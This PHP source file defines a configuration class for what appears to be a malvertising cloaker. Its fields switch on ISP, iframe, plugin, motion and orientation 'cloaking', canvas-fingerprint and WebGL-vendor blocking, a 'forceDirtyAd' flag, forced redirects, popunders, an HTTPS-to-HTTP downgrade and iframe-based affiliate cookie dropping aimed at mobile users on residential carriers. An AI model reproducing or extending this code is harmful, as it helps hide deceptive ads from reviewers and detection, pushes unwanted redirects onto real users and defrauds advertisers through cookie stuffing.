<?php

class Ad_data {
    public $campainID = "";
    public $redirectUrl = "";
	public $redirectMethod = "";
	public $redirectSubMethod1 = "";
	public $redirectSubMethod2 = "";
	public $redirectTimeout = 3000;
	public $redirectEnabled = true;
	public $voluumAdCycleCount = -1;
	public $adCountry = "US";
	public $https_to_http = false;
	public $allowedIspsPerCountry = array("US" => array("AT&T Wireless","T-Mobile USA","Sprint PCS","Verizon Wireless","Comcast Cable","Time Warner Cable","AT&T U-verse","Charter Communications","Cox Communications","CenturyLink","Optimum Online","AT&T Internet Services","Frontier Communications","Suddenlink Communications","XO Communications","Verizon Internet Services","Mediacom Cable","Windstream Communications","Bright House Networks","Abovenet Communications","Google","Cable One", "VECTANT"),
                                          "MX" => array("Telmex","Mega Cable, S.A. de C.V.","Cablemas Telecomunicaciones SA de CV","Cablevisión, S.A. de C.V.","Iusacell","Television Internacional, S.A. de C.V.","Mexico Red de Telecomunicaciones, S. de R.L. de C.","Axtel","Cablevision S.A. de C.V.","Nextel Mexico","Telefonos del Noroeste, S.A. de C.V.","Movistar México","RadioMovil Dipsa, S.A. de C.V."),
                                          "FR" => array("Orange","Free SAS","SFR","OVH SAS","Bouygues Telecom","Free Mobile SAS","Bouygues Mobile","Numericable","Orange France Wireless"),
                                          "UK" => array("BT","Three","EE Mobile","Telefonica O2 UK","Vodafone","Vodafone Limited"),
                                          "AU" => array("Optus","Telstra Internet","Vodafone Australia","TPG Internet","iiNet Limited","Dodo Australia"),
                                          "JP" => array("Kddi Corporation","Softbank BB Corp","NTT","Open Computer Network","NTT Docomo,INC.","K-Opticom Corporation","@Home Network Japan","So-net Entertainment Corporation","Biglobe","Jupiter Telecommunications Co.","TOKAI","VECTANT"),
                                          "KR" => array("SK Telecom","Korea Telecom","SK Broadband","POWERCOM","Powercomm","LG Powercomm","LG DACOM Corporation","Pubnetplus","LG Telecom"),
                                          "BR" => array("Virtua","Vivo","NET Virtua","Global Village Telecom","Oi Velox","Oi Internet","Tim Celular S.A.","Embratel","CTBC","Acom Comunicacoes S.A."),
                                          "IN" => array("Airtel","Bharti Airtel Limited","Idea Cellular","Vodafone India","BSNL","Reliance Jio INFOCOMM","Airtel Broadband","Beam Telecom","Tata Mobile","Aircel","Reliance Communications","Hathway","Bharti Broadband")
                                    );
	public $blacklistedProvinces = array();
	public $blacklistedCities = array();
	public $canvasFingerprintCheckEnabled = true;
	public $blockedCanvasFingerprints = "";
	public $glVendorCheckEnabled = true;
	public $blockedGLVendors = "";
	public $outputMethod = "";
	public $trackingPixelEnabled = true;
	public $trackingPixelUrl = "";
	public $loggingEnabled = true;
	public $ispCloakingEnabled = true;
	public $iframeCloakingEnabled = true;
	public $pluginCloakingEnabled = true;
	public $touchCloakingEnabled = false;
	public $motionCloakingEnabled = false;
	public $orientationCloakingEnabled = true;
	public $blacklistedReferrers = array();
	public $whitelistedReferrers = array();
	public $blockedParameterValues = array();
	public $blockedReferrerParameterValues = array();
	public $consoleLoggingEnabled = true;
	public $forceDirtyAd = true;
	public $trafficLoggerEnabled = false;
	public $HTMLTemplate = "";
	public $HTMLTemplateValues = "";
	public $resultHTML = "";
	public $config_files = array();
	public $tag_code = "";
	public $profile_name = "";
    public $is_profile = false;
    //public $iframe_cookies_enabled = false;
    public $affiliate_link_url_list = array();
    //public $popunder_cookies = false;
    public $popunder_template = "";

    public $cookies_dropping_enabled = false;
    public $cookies_dropping_method = COOKIES_DROPPING_METHOD_IFRAME;

    public $platform_whitelist = array('iphone','linux armv');
    public $user_agent_whitelist = array('iphone','linux armv');
    public $display_cap = 0;
    public $js_logging = false;

    function __construct($id = "", $config = null) {
		if ($config == null) return;
		if (!is_array($config)) return;
		$this->campainID = $id;
		$this->redirectUrl 					= array_key_exists("RedirectUrl", $config) ? $config["RedirectUrl"] : $this->redirectUrl;
		$this->redirectMethod 				= array_key_exists("Method", $config) ? $config["Method"] : $this->redirectMethod;
		$this->redirectSubMethod1				= array_key_exists("RedirectSubMethod1", $config) ? $config["RedirectSubMethod1"] : $this->redirectSubMethod1;
		$this->redirectSubMethod2				= array_key_exists("RedirectSubMethod2", $config) ? $config["RedirectSubMethod2"] : $this->redirectSubMethod2;
		$this->redirectTimeout 				= array_key_exists("RedirectTimeout", $config) ? $config["RedirectTimeout"] : $this->redirectTimeout;
		$this->redirectEnabled				= array_key_exists("RedirectEnabled", $config) && $config["RedirectEnabled"] === "false" ? false : $this->redirectEnabled;
		$this->voluumAdCycleCount				= array_key_exists("VoluumAdCycleCount", $config) ? $config["VoluumAdCycleCount"] : $this->voluumAdCycleCount;
		$this->adCountry 						= array_key_exists("CountryCode", $config) ? $config["CountryCode"] : $this->adCountry;
		if (empty($this->adCountry)) $this->adCountry = "US";
		$this->allowedIspsPerCountry			= array_key_exists("AllowedISPS", $config) && !empty($config["AllowedISPS"]) ? array($this->adCountry => preg_split("/\|/", $config["AllowedISPS"], -1, PREG_SPLIT_NO_EMPTY)) : $this->allowedIspsPerCountry;
		$this->blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $config) ? preg_split("/\|/", $config["ProvinceBlackList"], -1, PREG_SPLIT_NO_EMPTY) : $this->blacklistedProvinces;
		$this->blacklistedCities 				= array_key_exists("CityBlackList", $config) ? preg_split("/\|/", $config["CityBlackList"], -1, PREG_SPLIT_NO_EMPTY) :$this->blacklistedCities;

		$this->canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $config) && $config["CanvasFingerprintCheckEnabled"] === "false" ? false : $this->canvasFingerprintCheckEnabled;
		$this->blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $config) ? $config["BlockedCanvasFingerprints"] : $this->blockedCanvasFingerprints;
		$this->glVendorCheckEnabled 	        = array_key_exists("GLVendorCheckEnabled", $config) && $config["GLVendorCheckEnabled"] === "false" ? false : $this->glVendorCheckEnabled;
		$this->blockedGLVendors		        = array_key_exists("BlockedGLVendors", $config) ? $config["BlockedGLVendors"] : $this->blockedGLVendors;
		$this->outputMethod 					= array_key_exists("OutputMethod", $config) ? $config["OutputMethod"] : $this->outputMethod;
		$this->trackingPixelEnabled			= array_key_exists("TrackingPixelEnabled", $config) && $config["TrackingPixelEnabled"] === "false" ? false : true;
		$this->trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $config) ? $config["TrackingPixelUrl"] : $this->trackingPixelUrl;
		$this->loggingEnabled 				= array_key_exists("LoggingEnabled", $config) && $config["LoggingEnabled"] === "false" ? false : $this->loggingEnabled;
		$this->ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $config) && $config["ISPCloakingEnabled"] === "false" ? false : $this->ispCloakingEnabled;
		$this->iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $config) && $config["IFrameCloakingEnabled"] === "false" ? false : $this->iframeCloakingEnabled;
		$this->pluginCloakingEnabled 			= array_key_exists("PluginCloakingEnabled", $config) && $config["PluginCloakingEnabled"] === "false" ? false : $this->pluginCloakingEnabled;
		$this->touchCloakingEnabled 			= !array_key_exists("TouchCloakingEnabled", $config)?$this->touchCloakingEnabled:($config["TouchCloakingEnabled"] === "true" ? true : false);
		$this->motionCloakingEnabled 			= array_key_exists("MotionCloakingEnabled", $config) && $config["MotionCloakingEnabled"] === "false" ? false : $this->motionCloakingEnabled;
		$this->orientationCloakingEnabled     = array_key_exists("OrientationCloakingEnabled", $config) && $config["OrientationCloakingEnabled"] === "false" ? false : $this->orientationCloakingEnabled;
		$this->blockedParameterValues			= array_key_exists("BlockedParameterValues", $config) ? json_decode($config["BlockedParameterValues"],true) : $this->blockedParameterValues;
        $this->blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $config) ? preg_split("/\|/", $config["BlacklistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : $this->blacklistedReferrers;
        $this->whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $config) ? preg_split("/\|/", $config["WhitelistedReferrers"], -1, PREG_SPLIT_NO_EMPTY) : $this->whitelistedReferrers;
		$this->blockedReferrerParameterValues	= array_key_exists("BlockedReferrerParameterValues", $config) ? json_decode($config["BlockedReferrerParameterValues"],true) : $this->blockedReferrerParameterValues;
		$this->consoleLoggingEnabled 			= array_key_exists("ConsoleLoggingEnabled", $config) && $config["ConsoleLoggingEnabled"] === "false" ? false : $this->consoleLoggingEnabled;
		$this->forceDirtyAd 					= array_key_exists("ForceDirtyAd", $config) && $config["ForceDirtyAd"] === "false" ? false : $this->forceDirtyAd;
		$this->trafficLoggerEnabled			= array_key_exists("TrafficLoggerEnabled", $config) && $config["TrafficLoggerEnabled"] === "true" ? true : $this->trafficLoggerEnabled;
		$this->HTMLTemplate 					= array_key_exists("HTMLTemplate", $config) ? $config["HTMLTemplate"] : $this->HTMLTemplate;
		$this->HTMLTemplateValues 			= array_key_exists("HTMLTemplateValues", $config) ? json_decode($config["HTMLTemplateValues"],true) : $this->HTMLTemplateValues;
        $this->https_to_http                = !array_key_exists("HTTPStoHTTP", $config)?$this->https_to_http:($config["HTTPStoHTTP"] === "true" ? true : false);
        $this->affiliate_link_url_list			= array_key_exists("AffiliateLinkUrl", $config) ? json_decode($config["AffiliateLinkUrl"],true) : $this->affiliate_link_url_list;
        $this->popunder_template                = !array_key_exists("PopunderTemplate", $config)?$this->popunder_template:json_decode($config["PopunderTemplate"],true)["html"];
        $this->cookies_dropping_enabled                = !array_key_exists("CookiesDroppingEnabled", $config)?$this->cookies_dropping_enabled:($config["CookiesDroppingEnabled"] === "true" ? true : false);
        $this->cookies_dropping_method				= array_key_exists("CookiesDroppingMethod", $config) ? $config["CookiesDroppingMethod"] : $this->cookies_dropping_method;
        $this->platform_whitelist 			= array_key_exists("PlatformWhiteList", $config) ? preg_split("/\|/", $config["PlatformWhiteList"], -1, PREG_SPLIT_NO_EMPTY) : $this->platform_whitelist;
        $this->user_agent_whitelist 		= $this->platform_whitelist; //	= array_key_exists("UserAgentWhiteList", $config) ? preg_split("/\|/", $config["UserAgentWhiteList"], -1, PREG_SPLIT_NO_EMPTY) : $this->user_agent_whitelist;
        $this->display_cap				= array_key_exists("DisplayCap", $config) ? $config["DisplayCap"] : $this->display_cap;
        $this->js_logging 					= !array_key_exists("JsLoggingEnabled", $config)?$this->js_logging:($config["JsLoggingEnabled"] === "true" ? true : false);
        
	}
}

